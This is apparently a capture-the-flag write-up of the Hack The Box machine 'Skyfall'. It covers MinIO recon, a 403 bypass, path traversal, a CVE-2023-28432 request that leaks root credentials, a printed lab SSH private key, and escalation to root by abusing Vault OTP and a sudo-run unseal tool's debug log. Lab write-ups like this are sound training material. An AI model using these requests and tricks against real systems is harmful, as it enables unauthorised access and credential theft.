---
description: 'IP: 10.10.11.254 - Platform: Linux- Difficulty: Insane'
cover: ../.gitbook/assets/Skyfall.png
coverY: 301.18399999999997
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ◻ SKYFALL

## RECON

### Nmap

```
nmap -sV -sC -v -T4 -p- 10.10.11.254

Initiating Connect Scan at 00:46
Scanning 10.10.11.254 [65535 ports]
Discovered open port 22/tcp on 10.10.11.254
Discovered open port 80/tcp on 10.10.11.254

Host is up (0.045s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6570f71247073a888e27e9cb445d10fb (ECDSA)
|_  256 74483307b7889d320e3bec16aab4c8fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Skyfall - Introducing Sky Storage!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### FFUF

```
ffuf -c -u http://skyfall.htb -H "Host: FUZZ.skyfall.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://skyfall.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.skyfall.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

demo                    [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 61ms]
#www                    [Status: 400, Size: 166, Words: 6, Lines: 8, Duration: 41ms]
#mail                   [Status: 400, Size: 166, Words: 6, Lines: 8, Duration: 44ms]
```

**`ffuf`** ends up discovered a demo subdomain. Let add it into `/etc/hosts` file and access it.

## GAINING FOOTHOLD

### Enumerating on the website

<figure><img src="../.gitbook/assets/423036588_396942352883327_2020450717708441511_n.png" alt=""><figcaption><p>Image taken from skyfall.htb</p></figcaption></figure>

No valuable points of exploitation were discovered using automation tools such as the Nikto vulnerability scanner. However, while searching for other directories, we come across skyfall.htb/assets and receive only a 403 code in response. Let's shift our focus to the other subdomain since we haven't had any luck breaking into it yet.&#x20;

<figure><img src="../.gitbook/assets/423062765_1862329410890858_5174765670734243236_n.png" alt="" width="375"><figcaption><p>Login portal of demo.skyfall.htb</p></figcaption></figure>

Well, there is no need to use any tools to get around authentication since we are presented with the default credentials. Let hop in and look around to see if you can find anything helpful.

<figure><img src="../.gitbook/assets/423105531_923516372471819_1990932098032323772_n.png" alt=""><figcaption><p>Dashboard</p></figcaption></figure>

<figure><img src="../.gitbook/assets/423422279_920682549270738_2236155709537720576_n.png" alt=""><figcaption><p>Bingo! File Upload </p></figcaption></figure>

Upon closer inspection, it appears that uploading a normal malicious payload does not give us any shell. We learn something about this system from the dashboard. It supposed to be a MinIO Object Storage System.

{% hint style="info" %}
**MinIO** is a high-performance object store that works with S3. It is designed to handle massive workloads in databases, data lakes, and AI/ML. It is software-defined and runs on any cloud or on-premises infrastructure. Oh, and **MinIO** is also open-sourced!
{% endhint %}

Notice that we have 403 Forbidden on MINIO Metrics. Fear not, because there are two ways around this.

### 403 Bypass - Path Fuzzing

The 403 Forbidden response code signifies that although the client is authenticated, they do not possess the necessary permissions to view the resource that they have requested. When a server wishes to block a client from accessing a resource, it usually uses this response. This can happen when the resource is being purposefully hidden or restricted. There are many ways to bypass this:

* **HTTP Methods Fuzzing:** _sending the request again using a different method, such as POST, PUT, or PATCH_
* **HTTP Headers Fuzzing:** _sending_ a request _with an altered HTTP header to the intended server. The most often altered headers are X-Forwarded-For, Referer, and Authorization._
* **Path Fuzzing:** _the method we intended to use. Work by adding symbols, spaces, tabs,... to bypass the filter._
* **HTTP Request Smuggling:** _manipulated HTTP requests that take advantage of differences in how various parts of the HTTP request processing chain handle request data._

In this case, by adding a simple %0A (or %20 should be working) to the URL, we would get access into the metrics panel:

<figure><img src="../.gitbook/assets/423105914_285287807640173_837609814212167412_n.png" alt=""><figcaption><p>Booom!</p></figcaption></figure>

Examining the Internal Metrics, we discovered a fascinating subdomain:

<figure><img src="../.gitbook/assets/423036276_700638972220746_6871929665056337635_n.png" alt=""><figcaption><p>Huh? prd23-s3-backend?!?</p></figcaption></figure>

Adding it into our hosts file and see what in there:

<figure><img src="../.gitbook/assets/423036343_934967667683512_5216352693390125711_n.png" alt=""><figcaption><p>Holy!?</p></figcaption></figure>

### Bypass by LFI

So, we discovered right away that this kind of system is a cloud storage system. And metrics, right? Possibly requires a cloud-native monitoring platform on the back? If we look at the official documentation for MinIO, it should be noted that:

* MinIO exports Prometheus compatible data by default as an authorized endpoint at `/minio/v2/metrics/cluster`
* MinIO exports Prometheus compatible data by default which is bucket centric as an authorized endpoint at `/minio/v2/metrics/bucket`

Additionally, we can scrape per node metrics from MinIO in `/minio/v2/metrics/node`

Using the URL Fetch function, we can get LFI by modifying the request as followed:

<figure><img src="../.gitbook/assets/Screenshot 2024-02-10 235512.png" alt=""><figcaption><p>Modified the HTTP Methods to get our juicy info</p></figcaption></figure>

```
GET /download_file?filename=../minio/v2/metrics/node
```

or based on the previous info:

```
GET /download_file?filename=../minio/v2/metrics/cluster
```



### Leaking environment varibles through the use of CVE-2023-28432

It was discovered that MinIO has an information disclosure vulnerability ([CVE-2023-28432](https://www.pingsafe.com/blog/cve-2023-28432-minio-information-disclosure-vulnerability/)) that can be used to view sensitive data in the following method:

<figure><img src="../.gitbook/assets/423062638_1014009763623860_7158902365652575890_n.png" alt=""><figcaption><p>Wait?</p></figcaption></figure>

Here is the modified request:

```
POST /minio/bootstrap/v1/verify HTTP/1.1
Host: prd23-s3-backend.skyfall.htb:9000
Upgrade-Insecure-Requests: 1
Content-Length: 444

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 0
```

With both `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` in hand, we can now access the system's data by [mc](https://min.io/docs/minio/linux/reference/minio-mc.html).

Proceed to create an alias for an S3-compatible service after installing the client.

```
mc alias set myminio http://prd23-s3-backend.skyfall.htb MINIO_ROOT_USER MINIO_ROOT_PASSWORD
```

Upon examining the content, versions, and archives for a while, I came across `home_backup.tar.gz` in the directory for `askyy`,which caught my attention. Use this command to download it:

```
mc cp --recursive myminio/askyy/home_backup.tar.gz ./home_backup.tar.gz
```

Since that file contained nothing helpful, I looked up its prior occurrence:

```shell
mc cp --vid VERSION_ID myminio/askyy/home_backup.tar.gz ./home_backup.tar.gz
```

After extracting the versions, get the file:

<figure><img src="../.gitbook/assets/421652511_199344473235584_2306717479548298917_n.png" alt=""><figcaption><p>Tracing back to the previous revision of it</p></figcaption></figure>

<figure><img src="../.gitbook/assets/421586575_2164008293945083_5499725812446702794_n.png" alt=""><figcaption><p>LOL</p></figcaption></figure>

Within it is a file containing the SSH private key (You won't be using this to get your user flag anytime soon)

```
cat authorized_keys
 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC24FBEJuuHCJgHVvqk00ceKA4RATo/nmTkgsz0S5k5qiAsccLTgoUt7qbld6MlpNDnIflgOZ/sQxiYd64U8W95udZyHchBKdYuBUqxU8tQ0iMH/YPsHDy4G1i2yPC9YeiZ6WXKwiNqctfsxQGhoRxZaieiKokmEga3RDYTgg9PeZu++HYU8B/umpTcphU81LmYtHxizwtQDFC/dlS+8+hOy7ms2ZUZsYFG9oGlXXCGogxnr0ANOaPIwDbGJn+RpFsFCqNhuiRsV+iwRtFkfOueHhx1EOWLrUIcTw0YIZMRZIL9FGJe9H7BEfeI4/GM2p2KiyJMSUhFsdVstbrxK+RnSzn/pEg/7BT7nd2miFzbLv391klD+Gbzs8MrmtkdlFbrSriq4/V34AP/P2mcnXyT5g6L21TLJyFNxOWtZ6TXrkhTRS4uZBBendkpg7hMffMun9W/yxvmFQORCY0IQ6UAKZlilVH9xId9bGl7mqm4cNISeHetfPwQ38jKOvJzQZk= askyy@skyfall

cat id_rsa 
        
-----BEGIN OPENSSH PRIVATE KEY-----
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
r5CqjUuqs9QHv+GGNl/r2ydAdCY=
-----END OPENSSH PRIVATE KEY-----
```

`.bashrc` gave us some interesting pieces in this puzzle:

```
VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
VAULT_TOKEN="hvs.*****************v4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
```

Looking up on the internet, we discovered that this system uses [Vault](https://developer.hashicorp.com/vault/docs/what-is-vault).

### Gaining access through Vault OTP

With the provided credential, we could get access by Vault SSH. For SSH authentication on a network, Vault can generate a one-time password (OTP) each time a client wishes to SSH into a remote host.&#x20;

<figure><img src="../.gitbook/assets/assets.png" alt=""><figcaption><p>From: <a href="https://developer.hashicorp.com/vault/tutorials/secrets-management/ssh-otp">https://developer.hashicorp.com/vault/tutorials/secrets-management/ssh-otp</a></p></figcaption></figure>

So, basically, Vault server receives an OTP request from an authenticated client. An OTP is sent by Vault and returned if the client is approved. The client connects to the intended target host via SSH authentication using this OTP.

Download that tool and set the environment varibles:

```
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.*****************v4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
```

Verify that the token value is valid:

```
./vault login
```

Credentials can be supplied to the login endpoint to fetch a new Vault token via this [method](https://developer.hashicorp.com/vault/tutorials/getting-started/getting-started-apis):

<pre><code>curl \
--header "X-Vault-Token: $VAULT_TOKEN" \
<strong>--request POST \
</strong>--data '{"ip":"10.10.11.254", "username":"askyy"}' \
$VAULT_ADDR/v1/ssh/creds/dev_otp_key_role
</code></pre>

<figure><img src="../.gitbook/assets/423036321_912862480297288_6330296885249904578_n.png" alt=""><figcaption><p>Soon I will have access this machine.</p></figcaption></figure>

Then, log in with:

```
./vault ssh -role dev_otp_key_role -mode otp askyy@skyfall.htb
```

Boom! We got the user!

## PRIVILEGE ESCALATION <a href="#privilege-escalation" id="privilege-escalation"></a>

I didn't expect this system to be fairly straightforward.

Just the normal `sudo -l` and look at the output. Run vault-unseal as root and we could see that:

<pre><code><strong>[+] Reading: /etc/vault-unseal.yaml
</strong>[-] Security Risk!
[-] Master token found in config:
[>] Enable 'debug' mode for details
[+] Found Vault node: http://prd23-vau1t-internat.skyfatt.htb
<strong>[>] Check interval: 5s
</strong><strong>[>] Max checks: 5
</strong>[>] Checking seat status
[+] Vault sealed: false
</code></pre>

The output states that the master token was found, but you need to start debug mode to view the details.  So, the output option (-d) creates the debug.log but it's only readable by root. We can trick it to leak the token by create a debug.log file and change its permissions to `askyy`, then dictate the tool to output it into our file.

<figure><img src="../.gitbook/assets/Screenshot 2024-02-09 023825.png" alt=""><figcaption><p>Look at this magic!</p></figcaption></figure>

With that token, we can replicate the same way how we gain initial access to the machine.&#x20;

Set the environment varibles:

```
export VAULT_TOKEN="hvs.I0ewVsma*************mmG"
```

Valid that token then obtain a new Vault token for the OTP:

```
./vault login

Token (will be hidden): 
WARNING! The VAULT_TOKEN environment variable is set! The value of this
variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
update its value accordingly.

Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                hvs.I0ewVsma*************mmG
token_accessor       bXBeXR3r92WGQ8XgEDx6pIFu
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]


curl \
--header "X-Vault-Token: $VAULT_TOKEN" \
--request POST \
--data '{"ip":"10.10.11.254", "username":"root"}' \
$VAULT_ADDR/v1/ssh/creds/admin_otp_key_role

{"request_id":"d1f4a493-ecea-cfc7-b7f3-0b4142a420ab","lease_id":"ssh/creds/admin_otp_key_role/I5erjWFKIzT5NBDFFov2bXlX","renewable":false,"lease_duration":2764800,"data":{"ip":"10.10.11.254","key":"e65b2178-7e32-777b-84de-fa9b75b80892","key_type":"otp","port":22,"username":"root"},"wrap_info":null,"warnings":null,"auth":null}
```

And there you go! Root access, hooray!!!!!!!!!!!!!

## Verdict

Undoubtedly, a challenging machine to take control of. However, I'm glad that I don't have to chain together several exploits to obtain a shell alone. Granted, an insane machine ought to be so difficult that you would need to create a unique payload or write a script to take advantage of a configuration error in order to obtain root access, but this need not always be the case.

\
In my opinion, the challenge with this machine lies solely in the amount of time you have to dedicate to studying every little detail and experimenting with ideas you would never have considered.&#x20;
